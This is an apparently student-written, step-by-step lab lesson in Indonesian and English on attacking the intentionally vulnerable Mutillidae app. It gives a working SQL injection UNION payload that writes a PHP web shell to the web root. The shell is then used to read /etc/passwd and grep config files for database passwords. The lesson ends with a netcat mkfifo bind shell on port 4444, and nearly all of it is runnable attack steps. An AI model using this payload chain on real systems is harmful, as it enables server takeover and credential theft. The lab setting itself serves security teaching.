# Lesson 10 : SQL Injection Union Exploit #3 (Create PHP Execution Script)

## Start Web Browser Session to Mutillidae
- Buka browser kemudian akses Mutillidae sesuai ip metasploit pada alamat http://10.0.1.100/mutillidae
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/1/start_browser.png "Home page")

## Go To User Info Page
1. Go to User Info
   - OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info 

## Inject Backdoor into User Info Page
1. Inspect the Name Textbox with Firebug
   - Klik kanan pada Textbox Name, kemudian inspect element
2. Change Text Box Size
   - Pada bagian size, tambahkan kapasistasnya dari yg semula 20 menjadi 100
3. Second Union SQL Injection Attempt
   - Pada kolom Textbox **Name** isikan 
	```
		' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' -- 
	```
   - Pastikan anda menambahkan spasi setelah karakter **`--`**
   - Klik tombol View Account Details
4. Viewing the Results
	- Scroll kebawah untuk melihat hasilnya
	- Perhatikan hasilnya

## Using the Backdoor for Basic Reconnaissance
1. Initial Reconnaissance
	- Buka url berikut pada browser 
	http://192.168.1.111/mutillidae/execute_command.php
	- Ketikkan perintah berikut pada textbox
	  ```whoami; pwd```
	- Klik tombol Execute Command
2. Who is Logged On
   - Ketikkan perintah berikut pada textbox
	 ```w```
   - Klik tombol Execute Command
3. Exploring /etc/passwd
   - Ketikkan perintah berikut pada textbox
	 ```cat /etc/passwd```
   - Klik tombol Execute Command
4. Network Reconnaissance
   - Ketikkan perintah berikut pada textbox
	 ```netstat -nao | grep "0.0.0.0:"```
   - Klik tombol Execute Command

## Using the Backdoor for Database Reconnaissance
1. Database Reconnaissance
   - Ketikkan perintah berikut pada textbox
	 ```find * -name "*.php" | xargs grep -i "password" | grep "="```
   - Klik tombol Execute Command
2. View Database Authentication Attributes
	   - Ketikkan perintah berikut pada textbox
	 ```cat config.inc | grep -v "<?php"```
   - Klik tombol Execute Command

##  Using the Backdoor for Netcat Reconnaissance
1. Netcat Reconnaissance
   - Ketikkan perintah berikut pada textbox
	 ```which nc; netstat -nao | grep 4444 | wc -l```
   - Klik tombol Execute Command
2. Execute Netcat
   - Ketikkan perintah berikut pada textbox
	 ```mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe```
   - Klik tombol Execute Command